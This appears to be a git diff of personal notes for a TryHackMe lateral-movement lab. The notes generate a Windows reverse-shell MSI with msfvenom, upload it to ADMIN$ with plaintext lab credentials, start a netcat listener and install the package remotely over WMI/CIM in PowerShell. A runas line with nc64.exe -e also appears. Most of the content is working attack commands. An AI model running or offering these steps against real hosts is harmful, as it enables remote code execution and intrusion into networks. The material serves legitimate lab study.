@@ -161,18 +161,19 @@ runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "C:\tools\nc64.exe -e c
 
 ---
 
-## 3) Task: MSI package installation via msiexec
+## 3) Task: MSI package installation via WMI
 
 ### Generate MSI payload
 
 ```bash
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_VPN_IP> LPORT=4445 -f msi -o l337pkg.msi
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
 ```
 
 ### Upload MSI to ADMIN$ (fixed syntax)
 
 ```bash
 smbclient //thmiis.za.tryhackme.com/ADMIN$ -U 'za.tryhackme.com/t1_corine.waters%Korine.1994' -c 'put l337pkg.msi' --option='client min protocol=core'
+smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
 ```
 
 ### Start listener
@@ -183,8 +184,19 @@ sudo nc -lnvp 4445
 
 ### Install remotely with msiexec
 
-```cmd
-msiexec /i C:\Windows\l337pkg.msi /quiet /qn /norestart
+```powershell
+$username = 't1_corine.waters';
+$password = 'Korine.1994';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+### Invoke 
+
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
 ```
 
 ---
